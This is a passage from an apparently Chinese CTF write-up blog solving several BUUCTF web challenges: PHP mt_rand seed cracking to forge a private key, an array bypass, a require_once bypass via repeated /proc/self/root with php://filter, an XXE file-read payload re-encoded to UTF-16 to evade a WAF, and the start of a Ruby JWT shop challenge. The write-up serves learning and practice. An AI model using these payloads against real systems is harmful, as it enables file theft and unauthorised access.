class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$Public_key</span> = <span class="title function_ invoke__">public_key</span>();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>

<p>第一部分是一个登录 第二部分是公私钥 是个密码题？？？？</p>
<p>审计第一部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>我们需要知道用户名密码私钥 用户名是crispr已经给出 密码我们可以用万能钥匙去闭合 因此关键在于私钥</p>
<p><code> //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code>最后一句提示我们要通过公钥算出种子 再利用种子生成私钥</p>
<p>首先要爆破一下种子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="title function_ invoke__">len</span>(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="title function_ invoke__">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="title function_ invoke__">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689045182635-356c24fb-2eef-4543-a0b8-69d47c40d71c.png" alt="img"></p>
<p>爆破得种子1775196155  并且下面的私钥要用5.2.1到7.0.x的版本去算 不然算出来不一样 </p>
<p>我一开始用php8算的一直算的和wp不一样 版本要正确才行</p>
<p>再来算私钥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public:&quot;</span>.<span class="title function_ invoke__">public_key</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  private:&quot;</span>.<span class="title function_ invoke__">private_key</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到    <code>XuNhoueCDCGc </code></p>
<p>访问<code>/login.html</code> 登录即可</p>
<h1 id="106、-极客大挑战-2020-Roamphp1-Welcome"><a href="#106、-极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="106、[极客大挑战 2020]Roamphp1-Welcome"></a>106、[极客大挑战 2020]Roamphp1-Welcome</h1><p>这题太抽象了</p>
<p>首先进去什么也没有，然后抓包显示405状态码</p>
<p> HTTP状态码 405 表示请求的方法不允许。它是在客户端发送的请求方法与服务器上所允许的方法不匹配时使用的状态码。  </p>
<p>所以默认是get 我们尝试抓包后改为post方式 爆出了源码</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689144943353-7aeef221-d563-4b1f-a3f6-ce3aeaa1786e.png" alt="img"></p>
<p>很常见的套路 数组绕过就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roam1[]=1&amp;roam2[]=2</span><br></pre></td></tr></table></figure>

<p>然后可以看phpinfo</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689145004564-d20d1342-c322-450b-aa7f-c6e7959abc28.png" alt="img"></p>
<p>发现了<code>/f1444aagggg.php</code> 额。。但是访问啥也没有 然后就可以在这个phpinfo找到flag？？？</p>
<p>不懂为啥这题放在buu的第四页 </p>
<h1 id="107、-WMCTF2020-Make-PHP-Great-Again"><a href="#107、-WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="107、[WMCTF2020]Make PHP Great Again"></a>107、[WMCTF2020]Make PHP Great Again</h1><p>这道题目主要考察了require_once</p>
<p>他和require差不多 require_once 也会在包含文件时执行其中的代码并将其结果包含到主脚本中。区别在于，在包含相同文件时，require_once 会检查该文件是否已经被包含过，如果是，则不再重复包含，避免出现重复定义的错误。  </p>
<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(‘flag.php’)，已经包含的文件不可以再require_once。  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中已经包含过了所以我们就无法再利用这个函数去包含flag文件</p>
<p>这里有个知识点</p>
<p><strong>require_once()在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过</strong>，外加伪协议编码一下： </p>
<p>然后关于/proc/self/root </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146550618-3a5f2ae6-340b-42f9-b327-afe4657204bb.png" alt="img"></p>
<p>简单来说就是指向根目录的软链接 </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146577763-dce5b8bf-979b-4f0e-8204-c5e26913b88d.png" alt="img"></p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>

<p>这个我记得什么时候在ctfshow见过 反正又学到了</p>
<h1 id="108、-CSAWQual-2019-Web-Unagi"><a href="#108、-CSAWQual-2019-Web-Unagi" class="headerlink" title="108、[CSAWQual 2019]Web_Unagi"></a>108、[CSAWQual 2019]Web_Unagi</h1><p>这道题目目标还是很鲜明的 让我们上传文件 然后再把我们的内容展示出来 并且显示信息是xml格式的</p>
<p>所以我们可以上传xml文件进行xxe</p>
<p>一开始我上传的是:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE username [</span><br><span class="line">&lt;!ENTITY aaa SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt; ]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">	&lt;user&gt;</span><br><span class="line">		&lt;username&gt;&amp;aaa;&lt;/username&gt;</span><br><span class="line">		&lt;password&gt;&amp;aaa;&lt;/password&gt;</span><br><span class="line">		&lt;name&gt;&amp;aaa;&lt;/name&gt;</span><br><span class="line">		&lt;email&gt;&amp;aaa;&lt;/email&gt;</span><br><span class="line">		&lt;group&gt;&amp;aaa;&lt;/group&gt;</span><br><span class="line">		&lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">	&lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure>

<p>但是无论我去掉flag system都是被waf了 看了wp才明白可以用其他编码绕过</p>
<p>在kali <code>iconv -f utf8 -t utf16 1.xml&gt;2.xml</code></p>
<p>iconv 是一个在 Linux 和 Unix 系统上常用的字符编码转换工具。它可以将一个字符集的文本转换为另一个字符集的文本。  </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149395750-95a55a53-b147-4d9c-86e3-e1c4b5782c95.png" alt="img"></p>
<p>这里有个坑就是在xml文件中一定要包括他本来就存在的<code>&lt;intro&gt;&amp;xxe;&lt;/intro&gt;</code>这个标签 不然其他标签回显flag不完整都是一般 只有在这个回显的完整的</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149481560-7cacba81-1c98-408b-b818-fcafa4800307.png" alt="img"></p>
<h1 id="109、-SCTF2019-Flag-Shop"><a href="#109、-SCTF2019-Flag-Shop" class="headerlink" title="109、[SCTF2019]Flag Shop"></a>109、[SCTF2019]Flag Shop</h1><p>买flag 一眼丁真</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689155122030-02f4658e-9dee-4cad-9574-9990289024e7.png" alt="img"></p>
<p>就是伪造类似于session之类的去修改自己的钱数 然后再去买flag</p>
<p>但是需要key 抓个包 发现感觉是jwt</p>
<p>然后访问/robots.txt 爆出源码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, <span class="title class_">File</span>.dirname(<span class="variable constant_">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">FLAGPRICE</span> = <span class="number">1000000000000000000000000000</span></span><br><span class="line"><span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] = <span class="title class_">SecureRandom</span>.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = <span class="title class_">File</span>.new(<span class="title class_">File</span>.dirname(<span class="variable constant_">__FILE__</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use <span class="title class_">Rack</span><span class="symbol">:</span><span class="symbol">:CommonLogger</span>, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb <span class="variable constant_">IO</span>.binread <span class="variable constant_">__FILE__</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> <span class="title class_">SecureRandom</span>.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.encode payload,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + <span class="title class_">SecureRandom</span>.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    <span class="variable constant_">ERB</span><span class="symbol">:</span><span class="symbol">:new</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; <span class="variable constant_">FLAGPRICE</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">islogin</span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这是用ruby写的 虽然不懂语言 但是大致能明白干了个啥</p>
